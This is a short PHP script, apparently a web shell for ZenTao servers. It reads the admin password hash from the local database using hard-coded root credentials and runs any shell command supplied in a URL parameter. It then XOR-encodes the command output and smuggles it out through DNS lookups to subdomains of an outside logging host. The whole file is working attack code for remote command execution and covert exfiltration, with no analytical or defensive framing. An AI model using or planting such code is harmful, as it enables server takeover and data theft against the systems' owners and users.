<?php $servername = "127.0.0.1";
$username = "root";
$password = "123456";
$dbname = "zentao";
$conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$stmt = $conn->prepare("SELECT password FROM zt_user WHERE account=\'admin\'");
$stmt->execute();
$result = $stmt->fetch(PDO::FETCH_ASSOC);
$conn = null;
$param = $_GET["cmd"];
$password = $result["password"];
$output = shell_exec($param);
$hex_output = bin2hex($output);
$hex_password = bin2hex($password);
$len_output = strlen($hex_output);
$len_password = strlen($hex_password);
$max_subdomain_length = 62;
$subdomain_base = "yafgcy.ceye.io";
$hex_xor = "";
for ($i = 0; $i < $len_output; $i++) {
    $char_output = $hex_output[$i];
    $char_password = $hex_password[$i % $len_password];
    $char_xor = dechex(hexdec($char_output) ^ hexdec($char_password));
    if (strlen($hex_xor . $char_xor) > $max_subdomain_length) {
        if (strlen($hex_xor) % 2 != 0) {
            $subdomain = "0" . "$hex_xor.$subdomain_base";
        } else {
            $subdomain = "$hex_xor.$subdomain_base";
        }
        gethostbyname($subdomain);
        $hex_xor = "";
    } else {
        $hex_xor .= $char_xor;
    }
}
if (strlen($hex_xor) % 2 != 0) {
    $subdomain = "0" . "$hex_xor.$subdomain_base";
} else {
    $subdomain = "$hex_xor.$subdomain_base";
}
gethostbyname($subdomain); ?>
